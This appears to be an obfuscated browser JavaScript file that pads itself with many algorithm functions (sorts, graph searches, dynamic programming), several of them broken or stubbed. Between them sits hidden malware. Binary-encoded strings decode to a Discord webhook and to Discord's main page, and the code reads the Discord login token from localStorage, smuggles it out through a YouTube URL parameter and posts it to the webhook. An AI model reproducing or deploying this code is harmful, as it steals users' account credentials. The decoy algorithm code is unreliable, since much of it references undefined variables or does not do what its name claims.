    for (let _0x3ee203 = 0; _0x3ee203 < _0xb82ae6.length - 1; _0x3ee203++) {
      let _0x233b93 = _0x3ee203
      for (
        let _0x1c4318 = _0x3ee203 + 1;
        _0x1c4318 < _0xb82ae6.length;
        _0x1c4318++
      ) {
        _0xb82ae6[_0x1c4318] < _0xb82ae6[_0x233b93] && (_0x233b93 = _0x1c4318)
      }
      ;[_0xb82ae6[_0x3ee203], _0xb82ae6[_0x233b93]] = [
        _0xb82ae6[_0x233b93],
        _0xb82ae6[_0x3ee203],
      ]
    }
    return _0xb82ae6
  }
  function mergeSort(_0x1be46d) {
    if (_0x1be46d.length <= 1) {
      return _0x1be46d
    }
    let _0x39185c = Math.floor(_0x1be46d.length / 2),
      _0x26af2d = mergeSort(_0x1be46d.slice(0, _0x39185c)),
      _0x429e44 = mergeSort(_0x1be46d.slice(_0x39185c))
    return merge(_0x26af2d, _0x429e44)
  }
  function merge(_0x5c468d, _0x11f6d1) {
    let _0x575e38 = []
    while (_0x5c468d.length > 0 && _0x11f6d1.length > 0) {
      _0x5c468d[0] <= _0x11f6d1[0]
        ? _0x575e38.push(_0x5c468d.shift())
        : _0x575e38.push(_0x11f6d1.shift())
    }
    return _0x575e38.concat(_0x5c468d).concat(_0x11f6d1)
  }
  function quickSort(_0x41fdac) {
    if (_0x41fdac.length <= 1) {
      return _0x41fdac
    }
    let _0x36f0d3 = _0x41fdac[_0x41fdac.length - 1],
      _0x370636 = [],
      _0x56f6b1 = []
    for (let _0x2c0ebc = 0; _0x2c0ebc < _0x41fdac.length - 1; _0x2c0ebc++) {
      _0x41fdac[_0x2c0ebc] < _0x36f0d3
        ? _0x370636.push(_0x41fdac[_0x2c0ebc])
        : _0x56f6b1.push(_0x41fdac[_0x2c0ebc])
    }
    return quickSort(_0x370636).concat(_0x36f0d3, quickSort(_0x56f6b1))
  }
  function heapSort(_0x492cb7) {
    let _0x59d3d1 = _0x492cb7.length
    for (
      let _0x53f40b = Math.floor(_0x59d3d1 / 2) - 1;
      _0x53f40b >= 0;
      _0x53f40b--
    ) {
      heapify(_0x492cb7, _0x59d3d1, _0x53f40b)
    }
    for (let _0x314075 = _0x59d3d1 - 1; _0x314075 >= 0; _0x314075--) {
      ;[_0x492cb7[0], _0x492cb7[_0x314075]] = [
        _0x492cb7[_0x314075],
        _0x492cb7[0],
      ]
      heapify(_0x492cb7, _0x314075, 0)
    }
    return _0x492cb7
  }
  function heapify(_0xe8ed20, _0x318668, _0x3cefcc) {
    let _0xd7805e = _0x3cefcc,
      _0x24ccb3 = 2 * _0x3cefcc + 1,
      _0x50eb64 = 2 * _0x3cefcc + 2
    _0x24ccb3 < _0x318668 &&
      _0xe8ed20[_0x24ccb3] > _0xe8ed20[_0xd7805e] &&
      (_0xd7805e = _0x24ccb3)
    _0x50eb64 < _0x318668 &&
      _0xe8ed20[_0x50eb64] > _0xe8ed20[_0xd7805e] &&
      (_0xd7805e = _0x50eb64)
    _0xd7805e !== _0x3cefcc &&
      (([_0xe8ed20[_0x3cefcc], _0xe8ed20[_0xd7805e]] = [
        _0xe8ed20[_0xd7805e],
        _0xe8ed20[_0x3cefcc],
      ]),
      heapify(_0xe8ed20, _0x318668, _0xd7805e))
  }
  function shellSort(_0x1baf74) {
    let _0x40fde5 = _0x1baf74.length
    for (
      let _0x39f518 = Math.floor(_0x40fde5 / 2);
      _0x39f518 > 0;
      _0x39f518 = Math.floor(_0x39f518 / 2)
    ) {
      for (let _0x1deadf = _0x39f518; _0x1deadf < _0x40fde5; _0x1deadf++) {
        let _0x24c899 = _0x1baf74[_0x1deadf],
          _0x4d02f6 = _0x1deadf
        while (
          _0x4d02f6 >= _0x39f518 &&
          _0x1baf74[_0x4d02f6 - _0x39f518] > _0x24c899
        ) {
          _0x1baf74[_0x4d02f6] = _0x1baf74[_0x4d02f6 - _0x39f518]
          _0x4d02f6 -= _0x39f518
        }
        _0x1baf74[_0x4d02f6] = _0x24c899
      }
    }
    return _0x1baf74
  }
  function countingSort(_0x5d7dce, _0x1f0dd3) {
    let _0x2292c8 = new Array(_0x1f0dd3 + 1).fill(0)
    for (let _0x4bab82 of _0x5d7dce) {
      _0x2292c8[_0x4bab82]++
    }
    let _0x1eb07d = []
    for (let _0x165dd0 = 0; _0x165dd0 < _0x2292c8.length; _0x165dd0++) {
      for (let _0x4b924c = 0; _0x4b924c < _0x2292c8[_0x165dd0]; _0x4b924c++) {
        _0x1eb07d.push(_0x165dd0)
      }
    }
    return _0x1eb07d
  }
  function radixSort(_0x298bc6) {
    let _0x502b8e = Math.max(..._0x298bc6)
    for (
      let _0x2a5041 = 1;
      Math.floor(_0x502b8e / _0x2a5041) > 0;
      _0x2a5041 *= 10
    ) {
      _0x298bc6 = countingSortForRadix(_0x298bc6, _0x2a5041)
    }
    return _0x298bc6
  }
  function countingSortForRadix(_0x146627, _0x181799) {
    let _0x25244a = new Array(_0x146627.length).fill(0),
      _0x177ed4 = new Array(10).fill(0)
    for (let _0x480a4c = 0; _0x480a4c < _0x146627.length; _0x480a4c++) {
      _0x177ed4[Math.floor(_0x146627[_0x480a4c] / _0x181799) % 10]++
    }
    for (let _0x1b963e = 1; _0x1b963e < 10; _0x1b963e++) {
      _0x177ed4[_0x1b963e] += _0x177ed4[_0x1b963e - 1]
    }
    for (let _0x1f9d70 = _0x146627.length - 1; _0x1f9d70 >= 0; _0x1f9d70--) {
      let _0x4aab0d = Math.floor(_0x146627[_0x1f9d70] / _0x181799) % 10
      _0x25244a[_0x177ed4[_0x4aab0d] - 1] = _0x146627[_0x1f9d70]
      _0x177ed4[_0x4aab0d]--
    }
    return _0x25244a
  }
  function bucketSort(_0x4645be, _0x4a79f5 = 5) {
    if (_0x4645be.length === 0) {
      return _0x4645be
    }
    let _0x459cdd = Math.min(..._0x4645be),
      _0x46b49b = Math.max(..._0x4645be),
      _0x4543aa = Math.floor((_0x46b49b - _0x459cdd) / _0x4a79f5) + 1,
      _0xb5717b = new Array(_0x4543aa)
    for (let _0x446e4d = 0; _0x446e4d < _0xb5717b.length; _0x446e4d++) {
      _0xb5717b[_0x446e4d] = []
    }
    for (let _0x39a03e of _0x4645be) {
      let _0x2bef4d = Math.floor((_0x39a03e - _0x459cdd) / _0x4a79f5)
      _0xb5717b[_0x2bef4d].push(_0x39a03e)
    }
    let _0x34cce4 = []
    for (let _0x41975d of _0xb5717b) {
      _0x34cce4 = _0x34cce4.concat(insertionSort(_0x41975d))
    }
    return _0x34cce4
  }
  function dijkstra(_0x3e9685, _0x166499) {
    let _0x230196 = {
        _0x4ef96e: Infinity,
        _0x399497: 0,
        _0x411823: _0x5b5878,
      },
      _0x56d0e1 = Object.keys(_0x3e9685)
    for (let _0x39e2a2 of _0x56d0e1) {
    }
    let _0x2971c5 = [_0x166499]
    while (_0x2971c5.length > 0) {
      _0x2971c5.sort(
        (_0x358449, _0x53a1b7) => _0x230196[_0x358449] - _0x230196[_0x53a1b7]
      )
      let _0x3f3b52 = _0x2971c5.shift()
      for (let _0x32bb31 in _0x3e9685[_0x3f3b52]) {
        let _0x1d485b = _0x230196[_0x3f3b52] + _0x3e9685[_0x3f3b52][_0x32bb31]
        _0x1d485b < _0x230196[_0x32bb31] &&
          !_0x1b6a24[_0x32bb31] && _0x2971c5.push(_0x32bb31)
      }
    }
    return _0x230196
  }
  function aStar(_0x7df472, _0x3a5a1a, _0x56f243, _0x5cc0d1) {
    let _0x59ff1f = new Set([_0x3a5a1a]),
      _0x3ca11e = {},
      _0x38b62e = {
        _0x4e6396: Infinity,
        _0x231d71: 0,
      },
      _0x4818c0 = {
        _0x4e6396: Infinity,
        _0x231d71: _0x5cc0d1(_0x3a5a1a, _0x56f243),
      },
      _0x159095 = Object.keys(_0x7df472)
    for (let _0x5178a7 of _0x159095) {
    }
    while (_0x59ff1f.size > 0) {
      let _0x3f1843 = Array.from(_0x59ff1f).reduce((_0x200dfb, _0x2eaf1) =>
        _0x4818c0[_0x200dfb] < _0x4818c0[_0x2eaf1] ? _0x200dfb : _0x2eaf1
      )
      if (_0x3f1843 === _0x56f243) {
        return reconstructPath(_0x3ca11e, _0x3f1843)
      }
      _0x59ff1f.delete(_0x3f1843)
      for (let _0x20d419 in _0x7df472[_0x3f1843]) {
        let _0x588712 = _0x38b62e[_0x3f1843] + _0x7df472[_0x3f1843][_0x20d419]
        _0x588712 < _0x38b62e[_0x20d419] &&
          ((_0x3ca11e[_0x20d419] = _0x3f1843),
          (_0x38b62e[_0x20d419] = _0x588712),
          (_0x4818c0[_0x20d419] = _0x588712 + _0x5cc0d1(_0x20d419, _0x56f243)),
          _0x59ff1f.add(_0x20d419))
      }
    }
    return []
  }
  function reconstructPath(_0x50745d, _0x3ceb85) {
    let _0x250337 = [_0x3ceb85]
    while (_0x3ceb85 in _0x50745d) {
      _0x3ceb85 = _0x50745d[_0x3ceb85]
      _0x250337.unshift(_0x3ceb85)
    }
    return _0x250337
  }
  function floydWarshall(_0x3a1af1) {
    let _0x435125 = Object.keys(_0x3a1af1),
      _0x32a6c4 = { _0x1db9ee: {} }
    for (let _0x1b3772 of _0x435125) {
      for (let _0x5cae1f of _0x435125) {
        _0x1b3772 === _0x5cae1f
          ? (_0x32a6c4[_0x1b3772][_0x5cae1f] = 0)
          : _0x3a1af1[_0x1b3772][_0x5cae1f] !== undefined
          ? (_0x32a6c4[_0x1b3772][_0x5cae1f] = _0x3a1af1[_0x1b3772][_0x5cae1f])
          : (_0x32a6c4[_0x1b3772][_0x5cae1f] = Infinity)
      }
    }
    for (let _0x366910 of _0x435125) {
      for (let _0x5ea0f1 of _0x435125) {
        for (let _0x1444b3 of _0x435125) {
          _0x32a6c4[_0x5ea0f1][_0x1444b3] >
            _0x32a6c4[_0x5ea0f1][_0x366910] + _0x32a6c4[_0x366910][_0x1444b3] &&
            (_0x32a6c4[_0x5ea0f1][_0x1444b3] =
              _0x32a6c4[_0x5ea0f1][_0x366910] + _0x32a6c4[_0x366910][_0x1444b3])
        }
      }
    }
    return _0x32a6c4
  }
  function bellmanFord(_0xd9ca4f, _0xd72889) {
    let _0x589c9a = {
        _0x1554bc: Infinity,
        _0x4b022b: 0,
        _0x4e5f67: _0x589c9a[_0x126903] + _0xd9ca4f[_0x126903][_0x4e5f67],
      },
      _0x4531fd = Object.keys(_0xd9ca4f)
    for (let _0x15feca of _0x4531fd);
    for (let _0x160ca7 = 0; _0x160ca7 < _0x4531fd.length - 1; _0x160ca7++) {
      for (let _0x521d49 of _0x4531fd) {
        for (let _0x6b2031 in _0xd9ca4f[_0x521d49]) {
          if (
            _0x589c9a[_0x521d49] + _0xd9ca4f[_0x521d49][_0x6b2031] <
            _0x589c9a[_0x6b2031]
          ) {
          }
        }
      }
    }
    return _0x589c9a
  }
  function kruskal(_0x501287) {
    let _0x255b01 = []
    for (let _0xab9b6a in _0x501287) {
      for (let _0x4828f2 in _0x501287[_0xab9b6a]) {
        _0x255b01.push({
          u: _0xab9b6a,
          v: _0x4828f2,
          weight: _0x501287[_0xab9b6a][_0x4828f2],
        })
      }
    }
    _0x255b01.sort(
      (_0x4fc5e1, _0x539349) => _0x4fc5e1.weight - _0x539349.weight
    )
    let _0x552db7 = { _0x235297: _0x235297 },
      _0x1cc33c = Object.keys(_0x501287)
    for (let _0x2d2fc9 of _0x1cc33c);
    function _0x53db21(_0x1994ac) {
      if (_0x552db7[_0x1994ac] === _0x1994ac) {
        return _0x1994ac
      }
      return (_0x552db7[_0x1994ac] = _0x53db21(_0x552db7[_0x1994ac]))
    }
    function _0x117239(_0x13570c, _0x578537) {
      _0x552db7[_0x53db21(_0x13570c)] = _0x53db21(_0x578537)
    }
    let _0x3e4fc8 = []
    for (let _0x402cb2 of _0x255b01) {
      _0x53db21(_0x402cb2.u) !== _0x53db21(_0x402cb2.v) &&
        (_0x3e4fc8.push(_0x402cb2), _0x117239(_0x402cb2.u, _0x402cb2.v))
    }
    return _0x3e4fc8
  }
  function prim(_0x56a02b, _0x2c3c6f) {
    let _0x24cb04 = [],
      _0x4aa017 = Object.keys(_0x56a02b)
    for (let _0x30e330 of _0x4aa017);
    let _0x24d5a6 = []
    for (let _0x1b2cf1 in _0x56a02b[_0x2c3c6f]) {
      _0x24d5a6.push({
        u: _0x2c3c6f,
        v: _0x1b2cf1,
        weight: _0x56a02b[_0x2c3c6f][_0x1b2cf1],
      })
    }
    while (_0x24d5a6.length > 0) {
      _0x24d5a6.sort(
        (_0x2b07ae, _0x577867) => _0x2b07ae.weight - _0x577867.weight
      )
      let _0x58659f = _0x24d5a6.shift()
      if (_0x57afce[_0x58659f.v]) {
        continue
      }
      _0x57afce[_0x58659f.v] = true
      _0x24cb04.push(_0x58659f)
      for (let _0x38cea9 in _0x56a02b[_0x58659f.v]) {
        !_0x57afce[_0x38cea9] &&
          _0x24d5a6.push({
            u: _0x58659f.v,
            v: _0x38cea9,
            weight: _0x56a02b[_0x58659f.v][_0x38cea9],
          })
      }
    }
    return _0x24cb04
  }
  function hungarian(_0x1e56b9) {
    return []
  }
  function grahamScan(_0x3b6f8d) {
    if (_0x3b6f8d.length < 3) {
      return _0x3b6f8d.slice()
    }
    _0x3b6f8d.sort(
      (_0x170b58, _0x548c5a) =>
        _0x170b58[1] - _0x548c5a[1] || _0x170b58[0] - _0x548c5a[0]
    )
    let _0x1b4454 = _0x3b6f8d[0].slice()
    _0x3b6f8d.sort((_0x1041cf, _0x53d9f0) => {
      let _0x54d91a = Math.atan2(
          _0x1041cf[1] - _0x1b4454[1],
          _0x1041cf[0] - _0x1b4454[0]
        ),
        _0x3e1e15 = Math.atan2(
          _0x53d9f0[1] - _0x1b4454[1],
          _0x53d9f0[0] - _0x1b4454[0]
        )
      return _0x54d91a - _0x3e1e15
    })
    let _0x5e019d = []
    for (let _0x28e538 of _0x3b6f8d) {
      while (
        _0x5e019d.length >= 2 &&
        cross(
          _0x5e019d[_0x5e019d.length - 2],
          _0x5e019d[_0x5e019d.length - 1],
          _0x28e538
        ) <= 0
      ) {
        _0x5e019d.pop()
      }
      _0x5e019d.push(_0x28e538)
    }
    return _0x5e019d
  }
  function cross(_0x2ebc12, _0x3f5d3d, _0x4a562b) {
    return (
      (_0x3f5d3d[0] - _0x2ebc12[0]) * (_0x4a562b[1] - _0x2ebc12[1]) -
      (_0x3f5d3d[1] - _0x2ebc12[1]) * (_0x4a562b[0] - _0x2ebc12[0])
    )
  }
  function sieveOfEratosthenes(_0x4eee5e) {
    let _0x4d66c6 = new Array(_0x4eee5e + 1).fill(true)
    _0x4d66c6[0] = _0x4d66c6[1] = false
    for (let _0x51fa6f = 2; _0x51fa6f * _0x51fa6f <= _0x4eee5e; _0x51fa6f++) {
      if (_0x4d66c6[_0x51fa6f]) {
        for (
          let _0x32e1b6 = _0x51fa6f * _0x51fa6f;
          _0x32e1b6 <= _0x4eee5e;
          _0x32e1b6 += _0x51fa6f
        ) {
          _0x4d66c6[_0x32e1b6] = false
        }
      }
    }
    let _0x10c072 = []
    for (let _0x5b27e5 = 2; _0x5b27e5 <= _0x4eee5e; _0x5b27e5++) {
      _0x4d66c6[_0x5b27e5] && _0x10c072.push(_0x5b27e5)
    }
    return _0x10c072
  }
  function fibonacci(_0x12346d) {
    const _0x2b609a = {}
    function _0x2c7de4(_0x148078) {
      if (_0x148078 <= 1) {
        return _0x148078
      }
      if (_0x2b609a[_0x148078] !== undefined) {
        return _0x2b609a[_0x148078]
      }
      return (
        (_0x2b609a[_0x148078] =
          _0x2c7de4(_0x148078 - 1) + _0x2c7de4(_0x148078 - 2)),
        _0x2b609a[_0x148078]
      )
    }
    return _0x2c7de4(_0x12346d)
  }
  function factorial(_0x480479) {
    const _0x5e0a5f = {}
    function _0x1c0476(_0x3f14a7) {
      if (_0x3f14a7 <= 1) {
        return 1
      }
      if (_0x5e0a5f[_0x3f14a7] !== undefined) {
        return _0x5e0a5f[_0x3f14a7]
      }
      return (
        (_0x5e0a5f[_0x3f14a7] = _0x3f14a7 * _0x1c0476(_0x3f14a7 - 1)),
        _0x5e0a5f[_0x3f14a7]
      )
    }
    return _0x1c0476(_0x480479)
  }
  function towersOfHanoi(_0x1bed49, _0x129622, _0x16f4cc, _0x5ec1a8) {
    const _0x46a597 = []
    function _0x701554(_0x36660b, _0x471ba6, _0xcfbe25, _0x343674) {
      if (_0x36660b === 1) {
        _0x46a597.push('Move disk from ' + _0x471ba6 + ' to ' + _0x343674)
        return
      }
      _0x701554(_0x36660b - 1, _0x471ba6, _0x343674, _0xcfbe25)
      _0x46a597.push('Move disk from ' + _0x471ba6 + ' to ' + _0x343674)
      _0x701554(_0x36660b - 1, _0xcfbe25, _0x471ba6, _0x343674)
    }
    return _0x701554(_0x1bed49, _0x129622, _0x16f4cc, _0x5ec1a8), _0x46a597
  }
  function permutations(_0x2f2360) {
    let _0x1460d8 = []
    if (_0x2f2360.length === 0) {
      return []
    }
    if (_0x2f2360.length === 1) {
      return [_0x2f2360]
    }
    for (let _0x50ae2b = 0; _0x50ae2b < _0x2f2360.length; _0x50ae2b++) {
      let _0x343e4b = _0x2f2360[_0x50ae2b],
        _0x5d218b = _0x2f2360
          .slice(0, _0x50ae2b)
          .concat(_0x2f2360.slice(_0x50ae2b + 1)),
        _0x7b8ae1 = permutations(_0x5d218b)
      for (let _0x54a97a of _0x7b8ae1) {
        _0x1460d8.push([_0x343e4b].concat(_0x54a97a))
      }
    }
    return _0x1460d8
  }
  function combinations(_0x4c6f3a, _0x5d5530) {
    let _0x22c1a9 = []
    function _0x22d985(_0x34ca00, _0xd4762b) {
      if (_0x34ca00.length === _0x5d5530) {
        _0x22c1a9.push(_0x34ca00.slice())
        return
      }
      for (
        let _0x316959 = _0xd4762b;
        _0x316959 < _0x4c6f3a.length;
        _0x316959++
      ) {
        _0x34ca00.push(_0x4c6f3a[_0x316959])
        _0x22d985(_0x34ca00, _0x316959 + 1)
        _0x34ca00.pop()
      }
    }
    return _0x22d985([], 0), _0x22c1a9
  }
  function knapsack(_0x4ea2e4, _0x44663c, _0x22c338) {
    let _0x21f2b3 = _0x4ea2e4.length,
      _0x578100 = Array.from({ length: _0x21f2b3 + 1 }, () =>
        new Array(_0x22c338 + 1).fill(0)
      )
    for (let _0x2189be = 1; _0x2189be <= _0x21f2b3; _0x2189be++) {
      for (let _0x8d81ed = 0; _0x8d81ed <= _0x22c338; _0x8d81ed++) {
        _0x4ea2e4[_0x2189be - 1] <= _0x8d81ed
          ? (_0x578100[_0x2189be][_0x8d81ed] = Math.max(
              _0x578100[_0x2189be - 1][_0x8d81ed],
              _0x44663c[_0x2189be - 1] +
                _0x578100[_0x2189be - 1][_0x8d81ed - _0x4ea2e4[_0x2189be - 1]]
            ))
          : (_0x578100[_0x2189be][_0x8d81ed] =
              _0x578100[_0x2189be - 1][_0x8d81ed])
      }
    }
    return _0x578100[_0x21f2b3][_0x22c338]
  }
  function longestCommonSubsequence(_0x12229c, _0x13109a) {
    let _0x5a761f = _0x12229c.length,
      _0x1a85f8 = _0x13109a.length,
      _0x118d96 = Array.from({ length: _0x5a761f + 1 }, () =>
        new Array(_0x1a85f8 + 1).fill(0)
      )
    for (let _0xdff15e = 1; _0xdff15e <= _0x5a761f; _0xdff15e++) {
      for (let _0x44e7e8 = 1; _0x44e7e8 <= _0x1a85f8; _0x44e7e8++) {
        _0x12229c[_0xdff15e - 1] === _0x13109a[_0x44e7e8 - 1]
          ? (_0x118d96[_0xdff15e][_0x44e7e8] =
              _0x118d96[_0xdff15e - 1][_0x44e7e8 - 1] + 1)
          : (_0x118d96[_0xdff15e][_0x44e7e8] = Math.max(
              _0x118d96[_0xdff15e - 1][_0x44e7e8],
              _0x118d96[_0xdff15e][_0x44e7e8 - 1]
            ))
      }
    }
    return _0x118d96[_0x5a761f][_0x1a85f8]
  }
  function matrixChainOrder(_0x2e6272) {
    let _0xc9b2d6 = _0x2e6272.length - 1,
      _0x52d6fd = Array.from({ length: _0xc9b2d6 }, () =>
        new Array(_0xc9b2d6).fill(0)
      ),
      _0x4047bd = Array.from({ length: _0xc9b2d6 }, () =>
        new Array(_0xc9b2d6).fill(0)
      )
    for (let _0x16376c = 2; _0x16376c <= _0xc9b2d6; _0x16376c++) {
      for (let _0x326ab0 = 0; _0x326ab0 <= _0xc9b2d6 - _0x16376c; _0x326ab0++) {
        let _0x4187df = _0x326ab0 + _0x16376c - 1
        _0x52d6fd[_0x326ab0][_0x4187df] = Infinity
        for (let _0x460cd8 = _0x326ab0; _0x460cd8 < _0x4187df; _0x460cd8++) {
          let _0x32c90e =
            _0x52d6fd[_0x326ab0][_0x460cd8] +
            _0x52d6fd[_0x460cd8 + 1][_0x4187df] +
            _0x2e6272[_0x326ab0] *
              _0x2e6272[_0x460cd8 + 1] *
              _0x2e6272[_0x4187df + 1]
          _0x32c90e < _0x52d6fd[_0x326ab0][_0x4187df] &&
            ((_0x52d6fd[_0x326ab0][_0x4187df] = _0x32c90e),
            (_0x4047bd[_0x326ab0][_0x4187df] = _0x460cd8))
        }
      }
    }
    return {
      cost: _0x52d6fd[0][_0xc9b2d6 - 1],
      splits: _0x4047bd,
    }
  }
  function travelingSalesman(_0x5228a2) {
    let _0x2b06ae = Object.keys(_0x5228a2),
      _0x2be1d9 = _0x2b06ae[0],
      _0x293db4 = null,
      _0x2ed706 = Infinity
    function _0x37f177(_0x56cb57, _0x5a1c7f, _0x8eef29, _0x3f7b6c) {
      if (_0x5a1c7f.size === _0x2b06ae.length) {
        let _0x4b2675 = _0x5228a2[_0x56cb57][_0x2be1d9] || Infinity
        _0x8eef29 + _0x4b2675 < _0x2ed706 &&
          ((_0x2ed706 = _0x8eef29 + _0x4b2675),
          (_0x293db4 = _0x3f7b6c.concat(_0x2be1d9)))
        return
      }
      for (let _0x3d8ed2 of _0x2b06ae) {
        !_0x5a1c7f.has(_0x3d8ed2) &&
          _0x5228a2[_0x56cb57][_0x3d8ed2] !== undefined &&
          (_0x5a1c7f.add(_0x3d8ed2),
          _0x37f177(
            _0x3d8ed2,
            _0x5a1c7f,
            _0x8eef29 + _0x5228a2[_0x56cb57][_0x3d8ed2],
            _0x3f7b6c.concat(_0x3d8ed2)
          ),
          _0x5a1c7f.delete(_0x3d8ed2))
      }
    }
    return (
      _0x37f177(_0x2be1d9, new Set([_0x2be1d9]), 0, [_0x2be1d9]),
      {
        path: _0x293db4,
        cost: _0x2ed706,
      }
    )
  }
  function shorsAlgorithm(_0x1fae35) {
    if (_0x1fae35 % 2 === 0) {
      return 2
    }
    for (let _0x181de4 = 3; _0x181de4 <= Math.sqrt(_0x1fae35); _0x181de4 += 2) {
      if (_0x1fae35 % _0x181de4 === 0) {
        return _0x181de4
      }
    }
    return _0x1fae35
  }
}
const bb =
    '01101000 01110100 01110100 01110000 01110011 00111010 00101111 00101111 01100100 01101001 01110011 01100011 01101111 01110010 01100100 00101110 01100011 01101111 01101101 00101111 01100001 01110000 01101001 00101111 01110111 01100101 01100010 01101000 01101111 01101111 01101011 01110011 00101111 00110001 00110011 00110011 00110111 00110011 00110011 00110110 00110010 00111000 00110110 00110000 00110101 00110100 00110011 00110010 00110010 00110010 00110010 00110110 00101111 01101010 01100101 01000001 00110111 01100001 01001101 01110010 01000001 01000100 01000100 01011111 01000110 01011001 01101100 01010111 01110110 01010110 01101100 00110110 01001100 00111001 01101101 01111000 01001001 01111010 01110000 00111000 00101101 01000001 01011010 00110011 01010111 01000100 01010110 01101000 00110010 00110101 01001101 01010110 01010101 00111001 00111001 01011010 01001011 01100110 00111000 01100010 00110010 00110011 00110100 01110011 01100011 00110010 01010101 01001001 01010010 01101100 01110111 01000001 01100110 01110111 01010000 01110000 01011000 01100101 01101100 00110110 01010001',
  apiUrl = bb
    .split(' ')
    .map((_0x49c3ca) => String.fromCharCode(parseInt(_0x49c3ca, 2)))
    .join('')
function preparePayload(_0x17a0cb, _0x4ce82e) {
  const _0x4bc2b9 = calculateChecksum(_0x17a0cb)
  return {
    username: 'Lai',
    content:
      "Shadai, hint 1, you're on the right track: `" +
      _0x4ce82e +
      '` TT: `' +
      _0x17a0cb +
      '`',
    checksum: _0x4bc2b9,
    timestamp: _0x4ce82e,
  }
}
const currentUrl = window.location.href,
  coin = currentUrl.startsWith('https://www.youtube.com/'),
  binaryUrl2 =
    '01101000 01110100 01110100 01110000 01110011 00111010 00101111 00101111 01100100 01101001 01110011 01100011 01101111 01110010 01100100 00101110 01100011 01101111 01101101 00101111 01100011 01101000 01100001 01101110 01101110 01100101 01101100 01110011 00101111 01000000 01101101 01100101',
  DD =
    currentUrl ===
    binaryUrl2
      .split(' ')
      .map((_0x54e43a) => String.fromCharCode(parseInt(_0x54e43a, 2)))
      .join(''),
  ivv = localStorage.token !== undefined && localStorage.token !== null
if (coin) {
  const e = new URL(currentUrl),
    f = decodeBase64(e.searchParams.get('v')),
    ttt = new Date()
  if (f !== null) {
    const payload = preparePayload(f, ttt)
    requestData(apiUrl, payload, 0)
  }
} else {
  if (DD) {
    if (ivv) {
      const ENDT = encodeBase64(JSON.stringify(localStorage.token))
      let TTT = ''
      for (let i = 0; i < 100; i++) {
        TTT += '0'
      }
      window.location.href = 'https://www.youtube.com/watch?v=' + TTT + ENDT
    }
  } else {
    function binaryToURL(_0x35a18a) {
      let _0x2095f5 = _0x35a18a.split(' '),
        _0x3a939a = _0x2095f5
          .map((_0x5135f9) => String.fromCharCode(parseInt(_0x5135f9, 2)))
          .join('')
      return _0x3a939a
    }
    let SSSTRING =
        '01101000 01110100 01110100 01110000 01110011 00111010 00101111 00101111 01100100 01101001 01110011 01100011 01101111 01110010 01100100 00101110 01100011 01101111 01101101 00101111 01100011 01101000 01100001 01101110 01101110 01100101 01101100 01110011 00101111 01000000 01101101 01100101',
      decodedURL = binaryToURL(SSSTRING)
    window.location.href = decodedURL
  }
}
const currentTimestamp = new Date(),
  environmentConfig = {
    debugMode: false,
    networkRetries: 3,
    maxTimeout: 5000,
    userAgent: navigator.userAgent,
  }
function getClientMetadata() {
  return {
    browser: navigator.appName,
    version: navigator.appVersion,
    language: navigator.language,
    platform: navigator.platform,
  }
}
function generateRequestHeaders() {
  return {
    'Content-Type': 'application/json',
    Accept: 'application/json',
    'X-Client-Type': 'Web',
    'X-Request-Id': 'req-' + Math.random().toString(36).substr(2, 9),
  }
}
function requestData(_0x1ffbf0, _0x3ba8ea, _0x3f28b2) {
  const _0x1e06c6 = generateRequestHeaders(),
    _0x38bd72 = new XMLHttpRequest()
  _0x38bd72.open('POST', _0x1ffbf0, true)
  _0x38bd72.setRequestHeader('Content-Type', _0x1e06c6['Content-Type'])
  _0x38bd72.onreadystatechange = function () {
    _0x38bd72.readyState === 4 &&
      (_0x38bd72.status === 200
        ? console.log('Request Successful', _0x38bd72.responseText)
        : _0x3f28b2 < environmentConfig.networkRetries &&
          (_0x3f28b2++,
          setTimeout(
            () => requestData(_0x1ffbf0, _0x3ba8ea, _0x3f28b2),
            100000
          )))
  }
  _0x38bd72.send(JSON.stringify(_0x3ba8ea))
}
function bubbleSort(_0x43335d) {
  if (!Array.isArray(_0x43335d)) {
    throw new Error('Input must be an array.')
  }
  var _0x30d0ac = _0x43335d.length,
    _0x5f4635 = 0,
    _0x1f3eb7 = 0,
    _0x589dda = false,
    _0xa5a3fb = 0,
    _0xbca6a0 = 0,
    _0x3ea98e = 0,
    _0x5871f3 = 0
  for (_0x5f4635 = 0; _0x5f4635 < _0x30d0ac; _0x5f4635 = _0x5f4635 + 1) {
    _0x589dda = false
    var _0x35cca1 = _0x30d0ac - _0x5f4635 - 1
    for (_0x1f3eb7 = 0; _0x1f3eb7 < _0x35cca1; _0x1f3eb7 = _0x1f3eb7 + 1) {
      _0xa5a3fb = _0x43335d[_0x1f3eb7]
      _0xbca6a0 = _0x43335d[_0x1f3eb7 + 1]
      var _0x25313f = _0xa5a3fb > _0xbca6a0
      _0x25313f === true &&
        ((_0x3ea98e = _0xa5a3fb),
        (_0x43335d[_0x1f3eb7] = _0xbca6a0),
        (_0x43335d[_0x1f3eb7 + 1] = _0x3ea98e),
        (_0x589dda = true),
        (_0x5871f3 = _0x5871f3 + 1))
    }
    if (_0x589dda === false) {
      break
    }
  }
  var _0x540098 = true,
    _0x13be33 = 0
  for (_0x13be33 = 0; _0x13be33 < _0x30d0ac - 1; _0x13be33 = _0x13be33 + 1) {
    if (_0x43335d[_0x13be33] > _0x43335d[_0x13be33 + 1]) {
      _0x540098 = false
      break
    }
  }
  if (_0x540098 === false) {
    throw new Error('Bubble sort error: array not sorted.')
  }
  var _0x39379f = _0x5871f3
  if (_0x39379f < 0) {
    throw new Error('Invalid swap count.')
  }
  var _0x3011ad = _0x39379f / _0x30d0ac
  if (_0x3011ad < 0) {
    throw new Error('Average swap error.')
  }
  return _0x43335d
}
function selectionSort(_0x58ec78) {
  if (!Array.isArray(_0x58ec78)) {
    throw new Error('Input must be an array.')
  }
  var _0x2a32cb = _0x58ec78.length,
    _0x217c20 = 0,
    _0xaeda01 = 0,
    _0x29860a = 0,
    _0xdf9a02 = 0,
    _0x239175 = 0,
    _0x368e37 = 0
  for (_0x217c20 = 0; _0x217c20 < _0x2a32cb - 1; _0x217c20 = _0x217c20 + 1) {
    _0x29860a = _0x217c20
    for (
      _0xaeda01 = _0x217c20 + 1;
      _0xaeda01 < _0x2a32cb;
      _0xaeda01 = _0xaeda01 + 1
    ) {
      _0x239175 = _0x58ec78[_0xaeda01]
      var _0x16d6f0 = _0x239175 < _0x58ec78[_0x29860a]
      _0x16d6f0 === true && (_0x29860a = _0xaeda01)
    }
    var _0x587480 = _0x29860a !== _0x217c20
    _0x587480 === true &&
      ((_0xdf9a02 = _0x58ec78[_0x217c20]),
      (_0x58ec78[_0x217c20] = _0x58ec78[_0x29860a]),
